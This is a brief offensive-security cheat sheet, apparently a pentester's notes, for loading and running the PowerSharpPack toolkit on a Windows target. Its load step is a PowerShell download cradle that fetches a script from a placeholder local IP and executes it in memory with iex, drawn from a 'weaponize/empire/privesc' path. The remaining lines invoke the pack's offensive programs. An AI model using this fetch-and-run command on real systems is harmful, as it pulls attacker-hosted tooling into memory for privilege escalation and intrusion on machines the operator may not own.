# powersharppack
#plateform/windows #target/local #cat/RECON #tag/powershell

## load 
```powershell
iex(new-object net.webclient).downloadstring('http://<local_ip>:<port|80>/<dl_powersharppack_path>PowerSharpPack.ps1')
```

## list all programs
```powershell
PowerSharpPack 
```

## run specific programm
```powershell
PowerSharpPack -<name> -Command "<params>"
```

= dl_powersharppack_path: windows/windows_weaponize/ps/empire/privesc/